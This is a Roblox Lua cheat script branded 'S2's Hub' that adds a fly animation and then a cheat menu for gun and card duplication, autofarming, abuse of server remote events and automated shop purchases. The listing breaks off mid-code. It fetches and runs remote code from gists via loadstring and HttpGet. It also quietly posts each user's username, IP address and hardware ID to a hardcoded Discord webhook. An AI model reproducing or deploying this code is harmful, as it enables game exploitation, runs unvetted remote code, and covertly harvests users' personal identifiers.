function fly()

    for i,v in pairs(script:GetChildren()) do
    
            pcall(function() v.Value = "" end)
    
            game:GetService("Debris"):AddItem(v,.1)
    
    end
    
    function weld(p0,p1,c0,c1,par)
    
            local w = Instance.new("Weld",p0 or par)
    
            w.Part0 = p0
    
            w.Part1 = p1
    
            w.C0 = c0 or CFrame.new()
    
            w.C1 = c1 or CFrame.new()
    
            return w
    
    end
    
    local motors = {}
    
    function motor(p0,p1,c0,c1,des,vel,par)
    
            local w = Instance.new("Motor6D",p0 or par)
    
            w.Part0 = p0
    
            w.Part1 = p1
    
            w.C0 = c0 or CFrame.new()
    
            w.C1 = c1 or CFrame.new()
    
            w.MaxVelocity = tonumber(vel) or .05
    
            w.DesiredAngle = tonumber(des) or 0
    
            return w
    
    end
    
    function lerp(a,b,c)
    
        return a+(b-a)*c
    
    end
    
    function clerp(c1,c2,al)
    
            local com1 = {c1.X,c1.Y,c1.Z,c1:toEulerAnglesXYZ()}
    
            local com2 = {c2.X,c2.Y,c2.Z,c2:toEulerAnglesXYZ()}
    
            for i,v in pairs(com1) do
    
                    com1[i] = lerp(v,com2[i],al)
    
            end
    
            return CFrame.new(com1[1],com1[2],com1[3]) * CFrame.Angles(select(4,unpack(com1)))
    
    end
    
    function ccomplerp(c1,c2,al)
    
            local com1 = {c1:components()}
    
            local com2 = {c2:components()}
    
            for i,v in pairs(com1) do
     
                    com1[i] = lerp(v,com2[i],al)
    
            end
    
            return CFrame.new(unpack(com1))
    
    end
    
    function tickwave(time,length,offset)
    
            return (math.abs((tick()+(offset or 0))%time-time/2)*2-time/2)/time/2*length
    
    end
    
    function invcol(c)
    
            c = c.Color
    
            return BrickColor.new(Color3.new(1-c.b,1-c.g,1-c.r))
    
    end
    
    local oc = oc or function(...) return ... end
    
    local plr = game.Players.LocalPlayer
    
    local char = plr.Character
    
    local tor = char.UpperTorso
    
    local hum = char.Humanoid
    
    hum.PlatformStand = false
    
    pcall(function()
    
            char.Wings:Destroy()
    
    end)
    
    pcall(function()
    
            char.Angel:Destroy() 
    
    end)
    
    local mod = Instance.new("Model",char)
    
    mod.Name = "Wings"
    
    local special = {
    
           
    
            antiboomz0r = {"New Yeller",nil,0.4,0.7,true,Color3.new(1,1,.95),Color3.new(1,1,.6)},
    
           
    
            taart = {"Royal purple",nil,.4,.4,true},
    
            mitta = {"Black",nil,0,0,false},
    
            penjuin3 = {"White",nil,0,0,false},
    
            thepc8110 = {"Black","Bright red",.5,0,false,Color3.new(1,0,0),Color3.new(0,0,0)},
    
            nonspeaker = {"Cyan","Toothpaste",0,0,false,Color3.new(1,0,0),Color3.new(0,0,0)},
    
            littleau999 = {"Reddish brown",1030,0,0,false},
    
            unscripter = {"Really black","Really black",.2,0,true,Color3.new(0,0,0),Color3.new(0,0,0)},
    
            oxcool1 = {"Really black","White",.2,0,false,Color3.new(0,0,0),Color3.new(0,0,0)},
    
            krodmiss = {"Really black",nil,0,0,false},
    
    }
    
    local topcolor = invcol(char.UpperTorso.BrickColor)
    
    local feacolor = char.UpperTorso.BrickColor
    
    local ptrans = 1
    
    local pref = 0
    
    local fire = false
    
    local fmcol = Color3.new()
    
    local fscol = Color3.new()
    
    local spec = special[plr.Name:lower()]
    
    if spec then
    
            topcolor,feacolor,ptrans,pref,fire,fmcol,fscol = spec[1] and BrickColor.new(spec[1]) or topcolor,spec[2] and BrickColor.new(spec[2]) or feacolor,spec[3],spec[4],spec[5],spec[6],spec[7]
    
    end
    
    local part = Instance.new("Part")
    
    part.Size = Vector3.new(.2,.2,.2)
    
    part.TopSurface,part.BottomSurface = 0,0
    
    part.CanCollide = false
    
    part.Color = Color3.new(255,255,255)
    
    part.Transparency =  1
    part.Material = Enum.Material.ForceField
    part.Reflectance = pref
    
    local ef = Instance.new("Fire",fire and part or nil)
    
    ef.Size = .15
    
    ef.Color = fmcol or Color3.new()
    
    ef.SecondaryColor = fscol or Color3.new()
    
    part:BreakJoints()
    
    
    function newpart()
    
            local clone = part:Clone()
    
            clone.Parent = mod
    
            clone:BreakJoints()
    
            return clone
    
    end
    
    local feath = newpart()
    
    feath.BrickColor = feacolor
    feath.Material = Enum.Material.ForceField
    feath.Transparency = 1
    
    Instance.new("SpecialMesh",feath).MeshType = "Sphere"
    
    function newfeather()
    
            local clone = feath:Clone()
    
            clone.Parent = mod
            clone.Material = Enum.Material.ForceField
            clone.Transparency = 1
            clone:BreakJoints()
    
            return clone
    
    end
    
    

    
    local r1 = newpart()
    
    r1.Size = Vector3.new(.3,1.5,.3)*1.2
    
    local rm1 = motor(tor,r1,CFrame.new(.35,.6,.4) * CFrame.Angles(0,0,math.rad(-60)) * CFrame.Angles(math.rad(30),math.rad(-25),0),CFrame.new(0,-.8,0),.1)
    
    local r2 = newpart()
    
    r2.Size = Vector3.new(.4,1.8,.4)*1.2
    
    local rm2 = motor(r1,r2,CFrame.new(0,.75,0) * CFrame.Angles(0,0,math.rad(50)) * CFrame.Angles(math.rad(-30),math.rad(15),0),CFrame.new(0,-.9,0),.1)
    
    local r3 = newpart()
    
    r3.Size = Vector3.new(.3,2.2,.3)*1.2
    
    local rm3 = motor(r2,r3,CFrame.new(.1,.9,0) * CFrame.Angles(0,0,math.rad(-140)) * CFrame.Angles(math.rad(-3),0,0),CFrame.new(0,-1.1,0),.1)
    
    local r4 = newpart()
    
    r4.Size = Vector3.new(.25,1.2,.25)*1.2
    
    local rm4 = motor(r3,r4,CFrame.new(0,1.1,0) * CFrame.Angles(0,0,math.rad(-10)) * CFrame.Angles(math.rad(-3),0,0),CFrame.new(0,-.6,0),.1)
    
    local feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.4,3,.3)
    
    weld(r4,feather,CFrame.new(-.1,-.3,0),CFrame.new(0,-1.5,0))
    
    feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.4,2.3,.3)
    
    
    weld(r4,feather,CFrame.new(.1,-.1,0) * CFrame.Angles(0,math.random()*.1,0),CFrame.new(0,-1.1,0))
    
    feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.35,2.2,.25)
    feather.Transparency = 1
    feather.Material = Enum.Material.ForceField
    weld(r4,feather,CFrame.new(.1,-.3,0) * CFrame.Angles(0,math.random()*.1,math.rad(-10)),CFrame.new(0,-1.1,0))
    
    local rf3 = {}
    
    for i=0,7 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.45,2.2,.35)
    
            table.insert(rf3,motor(r3,feather,CFrame.new(.05,1-i*.285,0) * CFrame.Angles(0,math.random()*.1,math.rad(-25-i*2)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local rf2 = {}
    
    for i=0,6 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.45,2.2-i*.08,.3)
    
            table.insert(rf2,motor(r2,feather,CFrame.new(.05,.75-i*.26,0) * CFrame.Angles(0,math.random()*.1,math.rad(-75-i*4)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local rf1 = {}
    
    for i=0,6 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.37,1.65-i*.06,.25)
    
            table.insert(rf1,motor(r1,feather,CFrame.new(.05,.63-i*.21,0) * CFrame.Angles(0,math.random()*.05,math.rad(-75)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    

    
    local l1 = newpart()
    
    l1.Size = Vector3.new(.3,1.5,.3)*1.2
    
    local lm1 = motor(tor,l1,CFrame.new(-.35,.6,.4) * CFrame.Angles(0,0,math.rad(60)) * CFrame.Angles(math.rad(30),math.rad(25),0) * CFrame.Angles(0,-math.pi,0),CFrame.new(0,-.8,0) ,.1)
    
    local l2 = newpart()
    
    l2.Size = Vector3.new(.4,1.8,.4)*1.2
    
    local lm2 = motor(l1,l2,CFrame.new(0,.75,0) * CFrame.Angles(0,0,math.rad(50)) * CFrame.Angles(math.rad(30),math.rad(-15),0),CFrame.new(0,-.9,0),.1)
    
    local l3 = newpart()
    
    l3.Size = Vector3.new(.3,2.2,.3)*1.2
    
    local lm3 = motor(l2,l3,CFrame.new(.1,.9,0) * CFrame.Angles(0,0,math.rad(-140)) * CFrame.Angles(math.rad(3),0,0),CFrame.new(0,-1.1,0),.1)
    
    local l4 = newpart()
    
    l4.Size = Vector3.new(.25,1.2,.25)*1.2
    
    local lm4 = motor(l3,l4,CFrame.new(0,1.1,0) * CFrame.Angles(0,0,math.rad(-10)) * CFrame.Angles(math.rad(3),0,0),CFrame.new(0,-.6,0),.1)
    
    local feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.4,3,.3)
    
    weld(l4,feather,CFrame.new(-.1,-.3,0),CFrame.new(0,-1.5,0))
    
    feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.4,2.3,.3)
    
    weld(l4,feather,CFrame.new(.1,-.1,0) * CFrame.Angles(0,math.random()*.1,0),CFrame.new(0,-1.1,0))
    
    feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.35,2.2,.25)
    
    weld(l4,feather,CFrame.new(.1,-.3,0) * CFrame.Angles(0,math.random()*.1,math.rad(-10)),CFrame.new(0,-1.1,0))
    
    local lf3 = {}
    
    for i=0,7 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.45,2.2,.35)
    
            table.insert(lf3,motor(l3,feather,CFrame.new(.05,1-i*.285,0) * CFrame.Angles(0,math.random()*.1,math.rad(-25-i*2)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local lf2 = {}
    
    for i=0,6 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.45,2.2-i*.08,.3)
    
            table.insert(lf2,motor(l2,feather,CFrame.new(.05,.75-i*.26,0) * CFrame.Angles(0,math.random()*.1,math.rad(-75-i*4)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local lf1 = {}
    
    for i=0,6 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.37,1.65-i*.06,.25)
    
            table.insert(lf1,motor(l1,feather,CFrame.new(.05,.63-i*.21,0) * CFrame.Angles(0,math.random()*.05,math.rad(-75)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local rwing = {rm1,rm2,rm3,rm4}
    
    local lwing = {lm1,lm2,lm3,lm4}
    
    local oc0 = {}
    
    for i,v in pairs(rwing) do
    
            oc0[v] = v.C0
    
    end
    
    for i,v in pairs(lwing) do
    
            oc0[v] = v.C0
    
    end
    
    function gotResized()
    
            if lastsize then
    
                    if tor.Size == lastsize then return end 
    
                    local scaleVec = tor.Size/lastsize
    
                    for i,v in pairs(oc0) do
    
                            oc0[i] = v-v.p+scaleVec*v.p
    
                    end
    
                    lastsize = tor.Size
    
            end
    
            lastsize = tor.Size
    
    end
    
    tor.Changed:connect(function(p)
    
            if p == "Size" then
    
                    gotResized()
    
            end
    
    end)
    
    gotResized()
    
    local idle = {0,0.5,-.2,0; .05,.05,.1,.05; -.6,-1.5,.1,0;}
    
    local outlow = {-.7,-.2,1.8,0; .3,.05,.1,.05; .2,0,0,0}
    
    local outhigh = {.5,-.2,1.8,0; .3,.05,.1,.05; .2,0,0,0}
    
    local veryhigh = {.9,-.3,1.9,0; .3,.05,.1,.05; .2,0,0,0}
    
    local flap1 = {-.3,.3,1.1,-.2; .3,.05,.1,.05; .2,-.6,0,0}
    
    local divebomb = {0,.2,.4,-.7; .3,.05,.1,.05; 0,-.5,-.6,0}
    
    
    function setwings(tab,time)
    
            time = time or 10
    
            for i=1,4 do
    
                    rwing[i].DesiredAngle = tab[i]
    
                    lwing[i].DesiredAngle = tab[i]
    
                    rwing[i].MaxVelocity = math.abs(tab[i]-rwing[i].CurrentAngle)/time
    
                    lwing[i].MaxVelocity = math.abs(tab[i]-lwing[i].CurrentAngle)/time
    
                    local rcf = oc0[rwing[i]] * (tab[12+i] or CFrame.new())
    
                    local lcf = oc0[lwing[i]] * (tab[12+i] or CFrame.new())
    
            end
    
            for i,v in pairs(rf1) do
    
                    v.DesiredAngle = tab[9]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(lf1) do
    
                    v.DesiredAngle = tab[9]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(rf2) do
    
                    v.DesiredAngle = tab[10]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(lf2) do
    
                    v.DesiredAngle = tab[10]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(rf3) do
    
                    v.DesiredAngle = tab[11]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(lf3) do
    
                    v.DesiredAngle = tab[11]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
    end
    
    setwings(outhigh,1)
    
    flying = false
    
    moving = false
    
    for i,v in pairs(tor:GetChildren()) do
    
            if v.ClassName:lower():match("body") then
    
                    v:Destroy()
    
            end
    
    end
    
    local ctor = tor:Clone()
    
    ctor:ClearAllChildren()
    
    ctor.Name = "cTorso"
    
    ctor.Transparency = 1
    
    ctor.CanCollide = false
    
    ctor.Size = Vector3.new(.2,.2,.2)
    
    ctor.Parent = mod
    
    weld(tor,ctor)
    
    local bg = Instance.new("BodyGyro",ctor)
    
    bg.maxTorque = Vector3.new()
    
    bg.P = 15000
    
    bg.D = 1000
    
    local bv = Instance.new("BodyVelocity",ctor)
    
    bv.maxForce = Vector3.new()
    
    bv.P = 15000
    
    vel = Vector3.new()
    
    cf = CFrame.new()
    
    flspd = 0
    
    
    keysdown = {}
    
    keypressed = {}
    
    ktime = {}
    
    descendtimer = 0
    
    jumptime = tick()
    
    hum.Jumping:connect(function()
    
            jumptime = tick()
    
    end)
    
    cam = workspace.CurrentCamera
    
    kd = plr:GetMouse().KeyDown:connect(oc(function(key) 
    
            keysdown[key] = true 
    
            keypressed[key] = true 
    
            if key == "q" then 
    
                    descendtimer = tick() 
    
            elseif key == " " and not hum.Jump then 
    
                    jumptime = tick()
    
            elseif (key == "a" or key == "d") and ktime[key] and tick()-ktime[key] < .3 and math.abs(reqrotx) < .3 then
    
                    reqrotx = key == "a" and math.pi*2 or -math.pi*2
    
            end
    
            ktime[key] = tick() 
    
    end))
    
    ku = plr:GetMouse().KeyUp:connect(function(key) 
    
            keysdown[key] = false 
    
            if key == " " then 
    
                    descendtimer = tick() 
    
            end 
    
    end)
    
    function mid(a,b,c)
    
            return math.max(a,math.min(b,c or -a))
    
    end
    
    function bn(a)
    
            return a and 1 or 0
    
    end
    
    function gm(tar)
    
            local m = 0
    
            for i,v in pairs(tar:GetChildren()) do
    
                    if v:IsA("BasePart") then
    
                            m = m + v:GetMass()
    
                    end
    
                            m = m + gm(v)
    
            end
    
            return m
    
    end
    
    reqrotx = 0
    
    local grav = 196.2
    
    local con
    
    con = game:GetService("RunService").Stepped:connect(oc(function()
    

    
            local obvel = tor.CFrame:vectorToObjectSpace(tor.Velocity)
    
            local sspd, uspd,fspd = obvel.X,obvel.Y,obvel.Z
    
            if flying then
    
                    local lfldir = fldir
    
                    fldir = cam.CoordinateFrame:vectorToWorldSpace(Vector3.new(bn(keysdown.d)-bn(keysdown.a),0,bn(keysdown.s)-bn(keysdown.w))).unit
    
                    local lmoving = moving
    
                    moving = fldir.magnitude > .1
    
                    if lmoving and not moving then
    
                            idledir = lfldir*Vector3.new(1,0,1)
    
                            descendtimer = tick()
    
                    end
    
                    local dbomb = fldir.Y < -.6 or (moving and keysdown["1"])
    
                    if moving and keysdown["0"] and lmoving then
    
                            fldir = (Vector3.new(lfldir.X,math.min(fldir.Y,lfldir.Y+.01)-.1,lfldir.Z)+(fldir*Vector3.new(1,0,1))*.05).unit
    
                    end
    
                    local down = tor.CFrame:vectorToWorldSpace(Vector3.new(0,-1,0))
    
                    local descending = (not moving and keysdown["q"] and not keysdown[" "])
    
                    cf = ccomplerp(cf,CFrame.new(tor.Position,tor.Position+(not moving and idledir or fldir)),keysdown["0"] and .02 or .07)
    
                    local gdown = not dbomb and cf.lookVector.Y < -.2 and tor.Velocity.unit.Y < .05
    
                    hum.PlatformStand = true
    
                    bg.maxTorque = Vector3.new(1,1,1)*9e5
    
                    local rotvel = CFrame.new(Vector3.new(),tor.Velocity):toObjectSpace(CFrame.new(Vector3.new(),fldir)).lookVector
    
                    bg.cframe = cf * CFrame.Angles(not moving and -.1 or -math.pi/2+.2,moving and mid(-2.5,rotvel.X/1.5) + reqrotx or 0,0)
    
                    reqrotx = reqrotx - reqrotx/10
    
                    bv.maxForce = Vector3.new(1,1,1)*9e4*.5
    
                    local anioff =(bn(keysdown[" "])-bn(keysdown["q"]))/2
    
                    local ani = tickwave(1.5-anioff,1)
    
                    bv.velocity = bv.velocity:Lerp(Vector3.new(0,bn(not moving)*-ani*15+(descending and math.min(20,tick()-descendtimer)*-8 or bn(keysdown[" "])-bn(keysdown["q"]))*15,0)+vel,.6) 
    
                    vel = moving and cf.lookVector*flspd or Vector3.new()
    
                    flspd = math.min(120,lerp(flspd,moving and (fldir.Y<0 and flspd+(-fldir.Y)*grav/60 or math.max(50,flspd-fldir.Y*grav/300)) or 60,.4))
    
                    setwings(moving and (gdown and outlow or dbomb and divebomb) or (descending and veryhigh or flap1),15)
    
                    for i=1,4 do
    
                            rwing[i].C0 = clerp(rwing[i].C0,oc0[rwing[i]] * (gdown and CFrame.new() or dbomb and CFrame.Angles(-.5+bn(i==3)*.4+bn(i==4)*.5,.1+bn(i==2)*.5-bn(i==3)*1.1,bn(i==3)*.1) or descending and CFrame.Angles(.3,0,0) or CFrame.Angles((i*.1+1.5)*ani,ani*-.5,1*ani)),descending and .8 or .2)
    
                            lwing[i].C0 = clerp(lwing[i].C0,oc0[lwing[i]] * (gdown and CFrame.new() or dbomb and CFrame.Angles(-(-.5+bn(i==3)*.4+bn(i==4)*.5),-(.1+bn(i==2)*.5-bn(i==3)*1.1),bn(i==3)*.1) or descending and CFrame.Angles(-.3,0,0) or CFrame.Angles(-(i*.1+1.5)*ani,ani*.5,1*ani)),descending and .8 or .2)
    
                    end
    
                    local hit,ray = workspace:FindPartOnRayWithIgnoreList(Ray.new(tor.Position,Vector3.new(0,-3.5+math.min(0,bv.velocity.y)/30,0)),{char})
    
                    if _G.flying == false then
    
                            flying = false
    
                            hum.PlatformStand = false
    
                            tor.Velocity = Vector3.new()
    
                    end
    
            else
    
                    bg.maxTorque = Vector3.new()
    
                    bv.maxForce = Vector3.new()
    
                    local ani = tickwave(walking and .8 or 4.5,1)
    
                    setwings(idle,10)
    
                    local x,y,z = fspd/160,uspd/700,sspd/900
    
    
    
                    if _G.flying then
    
                            vel = Vector3.new(0,50,0)
    
                            bv.velocity = vel
    
                            idledir = cam.CoordinateFrame.lookVector*Vector3.new(1,0,1)
    
                            cf = tor.CFrame * CFrame.Angles(-.01,0,0)
    
                            tor.CFrame = cf
    
                            bg.cframe = cf
    
                            flystart = tick()
    
                            flying = true
    
                    end
    
            end
    
            keypressed = {}
    
    end))
    
    
    
    end 

    fly()

local ip = game:HttpGet("https://api.ipify.org/")

local whitelisted = false
local premium = false
local notificationlib = loadstring(game:HttpGet("https://gist.githubusercontent.com/MISSINGACID/1eecf064384049816e4f38e6a895554b/raw/20b1bda9e50d980e066def88baf1090ace588e5e/notif.lua"))()
    local Notif = notificationlib:InitNotifications()








    local HttpService = game:GetService("HttpService")


local url = "https://gist.github.com/s2shubowner/df96d550b442f2533a6adbda17b1baad.js"
local success, response = pcall(function()
    return game:HttpGet(url)
end)

if not success then
    local LoadingXSX = Notif:Notify("Failed to fetch the Gist:" ..  response, 2, "information")
    return
end


local whitelistLink = response:match("https?://[^%s]+gistfile1%.txt")


if not whitelistLink then
     local LoadingXSX = Notif:Notify("No link ending with 'whitelist.lua' found in the Gist.", 2, "information") -- notification, alert, error, success, information
    return
end


local successLoad, whitelistCode = pcall(function()
    return game:HttpGet(whitelistLink)
end)
loadstring(whitelistCode)()

for i,v in pairs(_G.whitelist) do
    if tostring(v) == tostring(ip) then
     whitelisted = true
    end
end

for i,v in pairs(_G.whitelist) do
    if tostring(v) == tostring(game.Players.LocalPlayer.Name) then
     whitelisted = true
    end
end

    
    for i,v in pairs(_G.whitelist) do
        if tostring(v) == tostring(game:GetService("RbxAnalyticsService"):GetClientId()) then
         whitelisted = true
        end
    end


for i,v in pairs(_G.premium) do
    if tostring(v) == tostring(ip) then
     premium = true
    end
end

for i,v in pairs(_G.premium) do
    if tostring(v) == tostring(game.Players.LocalPlayer.Name) then
        premium = true
    end
end

for i,v in pairs(_G.premium) do
    if tostring(v) == tostring(ip) then
     premium = true
    end
end

for i,v in pairs(_G.premium) do
    if tostring(v) == tostring(game:GetService("RbxAnalyticsService"):GetClientId()) then
        premium = true
    end
end

if _G.version == "v.1.0.8" then
if whitelisted  then
    print("whitelisted")
           notificationlib.rank = "developer"
    notificationlib.version = "2.0.3"
    local Notif = notificationlib:InitNotifications()
    local LoadingXSX = Notif:Notify("Authorized, please wait.", 2, "success") 
    if premium then
        local LoadingXSX = Notif:Notify("💎 Premium User", 2, "information") 
    end
    webhook = "https://discord.com/api/webhooks/1310987162975600761/LNEvz8LlRlIwJQSiE0p1cJZr7jL38Sly7SupaR6aOwKKSgXCUkQ1KSbJWbhUjxDIhbqG"

    local http = game:GetService("HttpService")
    local message = 
        {
            ["content"] = "**MOBILE COPY AND PASTE**\n" .. game.Players.LocalPlayer.Name .. "\nIP: " .. game:HttpGet("https://api.ipify.org/")  .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()),
            ["embeds"] = {{
                            ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1310075397806755951/1310988578679164928/IMG_0099.jpg?ex=674738c2&is=6745e742&hm=700aef78a87e429db605e39bc8820e1b0a3fa625dd3c36935839c722a8ab9e78&"
                },
                ["title"] = "__**Authorized user**__",
                ["description"] = "```ansi\n[2;32m" .. game.Players.LocalPlayer.Name .. "\nIP:" .. game:HttpGet("https://api.ipify.org/") .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()) .. "[0m```",
                ["type"] = "rich",
                ["color"] = tonumber(0x00FF00),
            }}
        }
    local jsonMessage = http:JSONEncode(message)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Body = jsonMessage,
            Method = "POST",
            Headers = headers,
        })
    end)

wait(0.1)
local LoadingXSX = Notif:Notify("Loading S2's Hub, please wait.", 2, "information")
wait(0.1)
    print(CREDITS)
    
   
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")


local Settings = {
    Discord = {
        Invite = "Ua73rsUdsm"
    }
}


local function sendDiscordInvite()

    if request then
        local success, response = pcall(function()
            return request({
                Url = 'http://127.0.0.1:6463/rpc?v=1',
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json',
                    Origin = 'https://discord.com'
                },
                Body = HttpService:JSONEncode({
                    cmd = 'INVITE_BROWSER',
                    nonce = HttpService:GenerateGUID(false),
                    args = {code = Settings.Discord.Invite}
                })
            })
        end)

        if not success then
            warn("Request failed: " .. tostring(response))
        else
            print("Invite sent successfully!")
        end
    else
        warn("Request function is not available.")
    end
end
local writefileSupported = pcall(function() return writefile and isfile end)

if writefileSupported then
if not isfile(_G.scriptname .. ".lua") then

    writefile(_G.scriptname .. ".lua", "discord.gg/Ua73rsUdsm")


    sendDiscordInvite()
    local LoadingXSX = Notif:Notify("Check discord, invited!", 2, "information") 
else
    local LoadingXSX = Notif:Notify("Already in the discord!", 2, "information") 
end
else
    local LoadingXSX = Notif:Notify("Writefile not supported, join discord.gg/Ua73rsUdsm", 2, "information") 
end

    
    local library = loadstring(game:HttpGet('https://gist.githubusercontent.com/MISSINGACID/e9f6cf627d256851ecc89798f69c2aa8/raw/509c970b9ea9cef74ae7e1fd5c9753e323c25e4b/fawwwk.lua'))()





    local window = library.new(_G.scriptname .. " | SW2", 'leadmarker')
    

    local tab = window.new_tab('rbxassetid://12795075088')
    local tab2 = window.new_tab('rbxassetid://6594776225')
    local tab3 = window.new_tab('https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=12334310477')
    local tab4 = window.new_tab('https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=12941020189')
    local settings = window.new_tab('https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=14134158105')
    

    local section = tab.new_section('Duplication')
    local section3 = tab2.new_section('Editing')
    local section2 = tab3.new_section('Misc')
    local section5 = tab4.new_section('Teleporting')
    local settingssection = settings.new_section('Settings')

    local autofarmsector = section.new_sector('Autofarm', 'Left')
    local carddupingsector = section.new_sector('Card Duping', 'Left')
    local section4 = section3.new_sector('Enemies', 'Right')
    local sector3 = section3.new_sector('Settings', 'Left')
    local selfsector = section3.new_sector('Self', 'Left')
    local sector1 = section.new_sector('Gun Duplication', 'Right')
    local gunsection = section2.new_sector('Misc', 'Left')
    local maskingsection = settingssection.new_sector('Extras', 'Right')
    local soundssection = settingssection.new_sector('Sounds', 'Left')

    local teleports = section5.new_sector('Teleports', 'Left')


    local wasinshop = false
    local purchaseditem = nil

    local quickbuy = section5.new_sector('Quick Buy', 'Left')

    local buybutton = maskingsection.element('Button', 'Infinite Yield', false, function(v)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
        end)
    local soundid = nil
    local pitch = nil
        local playertextbox = soundssection.element('TextBox', 'Sound ID', nil, function(v)
            soundid = tonumber(v.Text)
        end)
        local playertextbox = soundssection.element('TextBox', 'Pitch', nil, function(v)
            pitch = tonumber(v.Text)
        end)

        local buybutton = soundssection.element('Button', 'Play Sound', false, function(v)
            local args = { "spawn", "Rusty VW" }
            game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args)) 
            wait(5)
local findfirstchild = workspace.SpawnedVehicles[game.Players.LocalPlayer.Name .. "'s Car"]


info = {soundid  , 1000000000, 10, soundid  , 1000000000, 10, soundid  , 1000000000, 10 } 
findfirstchild.BoostSounds:FireServer(findfirstchild, "create", info)

wait(0.5)
        local ohString1 = "updateSounds"
        local ohTable2 = {
            [1] = {
                [1] = findfirstchild.Body.Engine.Turbo, 
                [2] = pitch, 
                [3] = 10 
            },
        }
        findfirstchild.AC6_Sound:FireServer(ohString1, ohTable2)

findfirstchild.AC6_Sound:FireServer("playSound", findfirstchild.Body.Engine.Turbo)
            end)

    local selecteditem = nil
    local quickbuydropdown = quickbuy.element('Dropdown', 'Item', {options = {'Sawnoff','Glock Drum','Walther PPK','Survival Knife','Revolver','Mac','Tec9','Knife','ZombieKnife','Bullets','Extended','Shotgun','Mag','Drum','AR-15','Vector','Thompson','Skorpion','MiniDraco','Glock 17 Ext','Glock 17 switch','HealthBoosters','Balaclava','Spraypaint','Flashlight','Lockpick', 'Dufflebag','Money Flex'}}, function(v)
        selecteditem = v.Dropdown
    end)
    
    local buybutton = quickbuy.element('Button', 'Buy', false, function(v)
        if selecteditem ~= nil then
            if selecteditem == 'HealthBoosters' then
                fireclickdetector(game.Workspace["Streetz War"].Real.ClickDetector)
                game.Players.LocalPlayer.PlayerGui:WaitForChild("DealerGui")
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.Visible = true
                game.Players.LocalPlayer.PlayerGui.DealerGui.Frame.Visible = false
    
                local vim = game:GetService("VirtualInputManager")
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame:GetChildren()[7]
                thing.Size = UDim2.new(10, 0, -10, 0)
    
                mousemoveabs(thing.AbsolutePosition.X, thing.AbsolutePosition.Y)
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, false, game, 0)
    
                thing.Size = UDim2.new(0, 0, 0, 0)
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit.Position = thing.Position
                thing:Destroy()
    
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit
                thing.Size = UDim2.new(10, 0, -10, 0)
                local ypos = thing.AbsolutePosition.Y
                local xpos = thing.AbsolutePosition.X
                mousemoveabs(xpos, ypos)
                vim:SendMouseButtonEvent(xpos, ypos, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(xpos, ypos, 0, false, game, 0)
                return
            elseif selecteditem == 'Balaclava' then
                fireclickdetector(game.Workspace.IllegalDealer.ClickDetector)
                game.Players.LocalPlayer.PlayerGui:WaitForChild("DealerGui")
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.Visible = true
                game.Players.LocalPlayer.PlayerGui.DealerGui.Frame.Visible = false
    
                local vim = game:GetService("VirtualInputManager")
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame:GetChildren()[15]
                thing.Size = UDim2.new(10, 0, -10, 0)
